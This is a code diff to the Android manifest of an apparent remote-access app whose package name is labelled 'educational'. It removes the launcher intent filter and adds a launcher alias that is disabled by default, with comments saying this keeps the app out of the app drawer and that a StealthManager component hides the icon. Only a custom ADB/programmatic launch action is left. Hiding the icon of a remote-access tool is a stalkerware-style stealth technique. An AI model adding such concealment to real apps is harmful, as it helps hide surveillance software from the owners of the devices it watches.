@@ -76,7 +76,8 @@
         tools:targetApi="34">
 
         <!--
-            Main Activity — visible in app drawer via LAUNCHER intent filter.
+            Main Activity — NOT visible in app drawer (no LAUNCHER intent filter).
+            Can still be opened via Settings > App Info > Open.
             Also handles the custom LAUNCH action for programmatic starts.
         -->
         <activity
@@ -84,17 +85,29 @@
             android:enabled="true"
             android:exported="true"
             android:launchMode="singleTop">
-            <!-- Launcher icon — makes the app appear in the app drawer -->
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
             <!-- Custom action for programmatic / ADB launch -->
             <intent-filter>
                 <action android:name="com.remoteaccess.educational.LAUNCH" />
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </activity>
+
+        <!--
+            Launcher alias — disabled by default so the app never appears in
+            the app drawer. StealthManager.hideAppIcon() targets this component.
+            Re-enable it (COMPONENT_ENABLED_STATE_ENABLED) to show the icon,
+            or leave/set disabled to keep it hidden.
+        -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
 
         <!-- Consent Activity -->
         <activity
